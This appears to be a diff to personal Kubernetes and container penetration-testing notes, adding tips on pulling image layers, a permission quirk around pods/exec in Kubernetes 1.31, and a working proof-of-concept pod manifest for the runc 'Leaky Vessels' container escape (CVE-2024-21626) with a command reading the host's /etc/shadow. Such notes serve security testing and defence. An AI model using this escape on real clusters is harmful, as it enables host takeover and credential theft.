@@ -70,9 +70,43 @@ Tiller (no authentication)
 	chroot /host
 
 
+Pulling individual layers from repos
 
+	Example:
+		want to get a layer which had kubectl in it
 
+	set an environment variable called token
+		export token=$(curl --silent "https://auth.docker.io/token?scope=repository:<target_repo>/<target_image>:pull&service=registry.docker.io" | jq -r '.token')
 
+	find the layer with the desired file (e.g. kubectl)
+		Option 1: web interface 
+			https://explore.ggcr.dev/?image=<target_repo>%2F<target_image>:latest
+		Option 2: Dive
+			https://github.com/wagoodman/dive
+
+	download the layer, which is a tar.gz file
+		curl -s -L -H "Authorization: Bearer $token" https://index.docker.io/v2/<target_repo>/<target_image>/blobs/sha256:<target_layer_blob_hash> -o kubectl.tar.gz
+
+Leaky Vessels - runc <1.1.12 - CVE-2024-21626
+	https://github.com/snyk/leaky-vessels-static-detector
+	https://github.com/snyk/leaky-vessels-dynamic-detector
+
+	PoC in k8s:
+ 
+		apiVersion: v1
+		kind: Pod
+		metadata:
+		  name: cve202421626
+		spec:
+		  containers:
+		  - name: ubuntu
+		    image: ubuntu
+		    workingDir: /proc/self/fd/8 #This number may differ depending on implementation
+		    command: ["sleep"]
+		    args: ["infinity"]
+ 
+		from inside the container you have access to the root filesystem of the host/node, i.e.:
+			cat ../../../../etc/shadow
 
 
 Exposed Kubernetes REST API Attack
@@ -90,3 +124,11 @@ K8s rights are additive
 	if a right is in ABAC or RBAC or Webhook, that right will be given
 
 
+K8s 1.31+ 
+	https://raesene.github.io/blog/2024/11/11/When-Is-Read-Only-Not-Read-Only/
+	pods/exec GET permission allows 
+	default in Kubernetes (<1.31) was to use SPDY for exec commands
+		e.g. if a user with GET rights on pods/exec tried to use kubectl exec in 1.29 you’d get: `Error from server (Forbidden): pods "test" is forbidden: User "bob" cannot create resource "pods/exec" in API group "" in the namespace "default"`
+	as of 1.31 exec commands uses WebSockets which allows it
+	using websockets with these rights was actually already possible
+		kubectl-execws - https://github.com/jpts/kubectl-execws
